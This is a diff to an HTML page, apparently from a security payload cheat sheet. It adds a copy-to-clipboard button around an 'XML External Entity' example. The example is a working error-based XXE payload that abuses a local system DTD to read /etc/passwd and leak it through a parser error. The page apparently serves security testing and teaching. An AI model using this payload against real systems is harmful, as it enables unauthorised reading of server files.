@@ -370,7 +370,7 @@
             
               <h1></h1>
               <h1 id="xml-external-entity">XML External Entity</h1>
-<pre><code class="language-xml">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
+<div class="clipboard-content">  <pre><code class="language-xml">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
 &lt;!DOCTYPE message [
     &lt;!ENTITY %local_dtd SYSTEM &quot;file://usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
     &lt;!ENTITY %   '
@@ -382,7 +382,19 @@
         %local_dtd;
 ]&gt;
 &lt;message&gt;...&lt;message&gt;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY %local_dtd SYSTEM &quot;file://usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+    &lt;!ENTITY %   '
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+            &amp;#x25;eval;
+            &amp;#x25;error;
+        '&gt;
+        %local_dtd;
+]&gt;
+&lt;message&gt;...&lt;message&gt;
+">    Copy  </button></div></div>
             
           </div>
           <footer>
